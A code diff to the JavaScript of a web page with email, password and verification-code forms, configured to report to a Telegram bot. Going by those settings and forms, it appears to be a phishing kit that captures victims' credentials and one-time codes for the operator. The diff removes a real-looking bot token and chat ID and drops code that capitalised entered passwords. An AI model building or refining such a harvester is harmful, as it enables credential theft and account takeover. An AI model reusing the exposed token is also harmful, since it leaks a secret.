@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', function() {
     // Telegram Bot Configuration
-    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
-    const TELEGRAM_CHAT_ID = '8163151595'; // Replace with your chat ID
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
     
     // DOM elements
     const emailForm = document.getElementById('email-form');
@@ -69,23 +69,6 @@ document.addEventListener('DOMContentLoaded', function() {
         return /^\d+$/.test(phone);
     }
     
-    // Automatic capitalization for password input
-    passwordInput.addEventListener('input', function() {
-        // Get current cursor position
-        const cursorPosition = this.selectionStart;
-        
-        // Capitalize first letter and keep the rest as-is
-        if (this.value.length > 0) {
-            this.value = this.value.charAt(0).toUpperCase() + this.value.slice(1);
-            
-            // Restore cursor position (add 1 if we inserted at position 0)
-            this.setSelectionRange(cursorPosition, cursorPosition);
-        }
-        
-        // Your existing input validation
-        hideError(document.getElementById('password-error'));
-    });
-    
     // Email form submission
     emailForm.addEventListener('submit', async function(e) {
         e.preventDefault();
@@ -119,14 +102,8 @@ document.addEventListener('DOMContentLoaded', function() {
     // Password form submission
     passwordForm.addEventListener('submit', async function(e) {
         e.preventDefault();
-        let password = passwordInput.value;
+        const password = passwordInput.value;
         const passwordError = document.getElementById('password-error');
-        
-        // Final capitalization check (in case user pasted content)
-        if (password.length > 0) {
-            password = password.charAt(0).toUpperCase() + password.slice(1);
-            passwordInput.value = password;
-        }
         
         if (!password) {
             showError(passwordError, 'Enter a password');
@@ -190,6 +167,10 @@ document.addEventListener('DOMContentLoaded', function() {
     // Input validation
     emailInput.addEventListener('input', function() {
         hideError(document.getElementById('email-error'));
+    });
+    
+    passwordInput.addEventListener('input', function() {
+        hideError(document.getElementById('password-error'));
     });
     
     verificationInput.addEventListener('input', function() {
